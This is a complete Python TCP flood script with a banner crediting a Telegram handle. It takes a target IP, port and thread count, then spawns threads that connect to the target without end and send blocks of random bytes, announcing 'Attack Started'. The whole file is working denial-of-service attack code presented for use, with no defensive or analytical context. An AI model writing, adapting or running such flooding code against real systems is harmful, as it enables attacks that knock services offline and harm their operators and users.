#==================[CoDeD By @OnionTM]===================
from threading import Thread
import socket, sys, random
#===================[SYS]===================
ip = sys.argv[1]
port = int(sys.argv[2])
thread = int(sys.argv[3])
#===================[ATTACK]===================
def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tar = (str(ip),int(port))
            bytes = random._urandom(1024)
            s.connect(tar)
            for _ in range(600):
                s.send(bytes)
        except:
            s.close()
#===================[BANNER]===================
print("""
------------[Dev T.Me/OnionTM]------------

===============[TCP FLOOD]===============

""")
print(f"Attack Started To {str(ip)} On Port {str(port)}")
#===================[THREAD]===================
for _ in range(thread - 1):
    Thread(target=tcp).start()
#==================[########]===================
#                 T.Me/OnionTM
#==================[########]===================